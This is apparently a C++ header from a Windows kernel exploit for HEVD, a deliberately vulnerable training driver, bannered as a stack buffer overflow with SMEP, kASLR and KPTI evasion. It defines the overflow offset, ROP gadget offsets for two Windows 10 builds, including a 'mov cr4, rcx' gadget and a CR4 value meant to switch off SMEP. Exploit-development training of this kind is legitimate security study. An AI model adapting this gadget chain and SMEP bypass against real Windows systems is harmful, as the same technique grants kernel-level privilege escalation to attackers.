#pragma once
#include <vector>

#define BANNER \
R"(

  _      ___         __                 __ __                 __  ____           __     _ __ 
 | | /| / (_)__  ___/ /__ _    _____   / //_/__ _______  ___ / / / __/_ __ ___  / /__  (_) /_
 | |/ |/ / / _ \/ _  / _ \ |/|/ (_-<  / ,< / -_) __/ _ \/ -_) / / _/ \ \ // _ \/ / _ \/ / __/
 |__/|__/_/_//_/\_,_/\___/__,__/___/ /_/|_|\__/_/ /_//_/\__/_/ /___//_\_\/ .__/_/\___/_/\__/ 
   __ _______   _____          ______           __   ____               /_/__                
  / // / __/ | / / _ \  ____  / __/ /____ _____/ /__/ __ \_  _____ ____/ _/ /__ _    __      
 / _  / _/ | |/ / // / /___/ _\ \/ __/ _ `/ __/  '_/ /_/ / |/ / -_) __/ _/ / _ \ |/|/ /      
/_//_/___/ |___/____/       /___/\__/\_,_/\__/_/\_\\____/|___/\__/_/ /_//_/\___/__,__/       
                                                                                             
[*] HEVD Kernel Exploit by Red Meow ;)
[*] Stack Based Buffer Overflow with SMEP, kASLR, KPTI Evasion Technique)"

#define OFFSET 2072

// ROP
// 1 = Windows 10 Build 19045
// 2 = Windows 10 Build 14393

std::vector<std::vector<unsigned long long>> ROP_Gadgets = {
	{
		0x38f6a3, // 0  - xor ecx, ecx ; mov rax, rcx ; ret
		0x86b3de, // 1  - pop rdx ; ret
		0xa1a718, // 2  - add rsp, 0x20 ; ret
		0x8889f4, // 3  - push rax, pop rdi ; ret
		0x80fe3c, // 4  - jmp rdi
		0x93fc3a, // 5  - mov rcx, r8 ; mov rax, rcx ; ret
		0x254656, // 6  - xchg r8, r13 ; ret
		0x5b59c4, // 7  - push rax ; pop r13 ; ret
		0x30e0a0, // 8  - pop r8 ; ret
		0x3a06a7, // 9  - mov cr4, rcx ; ret
		0x249094, // 10 - pop rcx ; ret
	},
	{
		0x13b44d, // 0  - add esp, edi ; ret
		0x1d4107, // 1  - pop rdi ; ret
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		0x3d6431, // 9   - mov cr4, rcx ; ret
		0x3c897d, // 10  - pop rcx ; ret
	}
};

std::vector<unsigned long long> ROP_ExploitData = {
	0x1000,
	0x100,
	0x70678, // CR4 Value
	0xfffffffffffff7d0 // -0x830
};
